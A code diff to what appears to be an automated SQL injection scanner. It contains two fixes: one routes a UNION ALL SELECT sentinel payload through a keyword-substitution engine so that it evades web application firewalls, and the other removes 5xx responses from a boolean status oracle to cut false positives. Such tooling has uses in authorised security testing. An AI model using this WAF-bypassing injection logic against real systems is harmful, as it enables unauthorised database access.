@@ -112547,8 +112547,29 @@ class TechniqueCascadeEngine:
                     _cols = ['NULL'] * _n_cols
                     _cols[_ci] = _concat
                     _sent_pay = f"{_pay_prefix}UNION ALL SELECT {','.join(_cols)}-- -"
+                    # BUG-UNION-SENTINEL-NO-KW-BYPASS FIX (LOW-MEDIUM, all DBMSes, U/UH/UE
+                    # techniques, WAF-bypass UNION targets):
+                    # The UNION sentinel probe was built and sent via self._safe_confirm without
+                    # applying the keyword bypass engine (_keyword_engine). On WAF-bypass targets
+                    # where UNION or SELECT are blocked at the WAF layer and require keyword
+                    # substitution (e.g. "UNION" → "UN/**/ION"), _safe_confirm sends the raw
+                    # sentinel, the WAF blocks it, the sentinel is never reflected in the response,
+                    # and PCV returns False for a genuine UNION injection.
+                    # The equivalent sentinel probe in _post_confirm_verify_locked routes through
+                    # _pcv_send which DOES apply keyword bypass. This discrepancy meant the two
+                    # UNION PCV code paths had different WAF-bypass behaviour.
+                    # Fix: resolve the keyword engine from self._keyword_engine and apply it to
+                    # the full injected value (original + payload) before sending, matching the
+                    # pattern used by _pcv_send in _post_confirm_verify_locked.
+                    _pcv_kw_u = getattr(self, '_keyword_engine', None)
+                    _u_full_value = original + _sent_pay
+                    if _pcv_kw_u and getattr(_pcv_kw_u, 'working_bypass', None):
+                        try:
+                            _u_full_value = _pcv_kw_u.apply_bypass(_u_full_value)
+                        except Exception:
+                            pass  # non-fatal: proceed with unmodified value
                     _sfp = await self._safe_confirm(method, url, data, data_fmt,
-                        param, original + _sent_pay, self.tamper_chain)
+                        param, _u_full_value, self.tamper_chain)
                     if _sfp and _validate_response(_sfp, "_sfp_sentinel_check") and _SENTINEL.encode() in _sfp.body:
                         print(f"[+] PCV CONFIRMED [U] {dbms}  sentinel '{_SENTINEL}' "
                               f"reflected in col {_ci}/{_n_cols}  SQL execution proven", flush=True)
@@ -116236,8 +116257,22 @@ class TechniqueCascadeEngine:
                         # Status codes diverged — check polarity match
                         _ca_t_matches = (_pcv_bool_true_status is not None
                                          and _ca_st_t == _pcv_bool_true_status)
+                        # BUG-STATUS-ORACLE-5XX FIX (MEDIUM, all DBMSes, all techniques,
+                        # status-oracle path): _ca_f_matches previously accepted ANY status
+                        # != _pcv_bool_true_status, including 500/502/503/504 server errors.
+                        # When the true canary triggers WAF (400) and the false canary causes
+                        # a server error (500), both conditions pass and a strength-1.0 pair is
+                        # appended as `is_strong=True`. Combined with any other passing pair from
+                        # a different family (e.g. body-size delta), the two-family requirement
+                        # is satisfied and Check A confirms injection without C or E corroboration.
+                        # This is a pure false-positive path: WAF returns 400 for the injected
+                        # true canary, and the false canary coincidentally trips a server error.
+                        # Fix: exclude 5xx server error codes from the false-canary match. Only
+                        # 1xx/2xx/3xx/4xx (non-server-error) responses that differ from the
+                        # calibrated True status constitute a genuine polarity-matched divergence.
                         _ca_f_matches = (_pcv_bool_true_status is not None
-                                         and _ca_st_f != _pcv_bool_true_status)
+                                         and _ca_st_f != _pcv_bool_true_status
+                                         and not (500 <= (_ca_st_f or 0) <= 599))
                         if _ca_t_matches and _ca_f_matches:
                             # True canary → calibrated True status; False canary → different status
                             # This matches the oracle polarity exactly → real injection evidence.
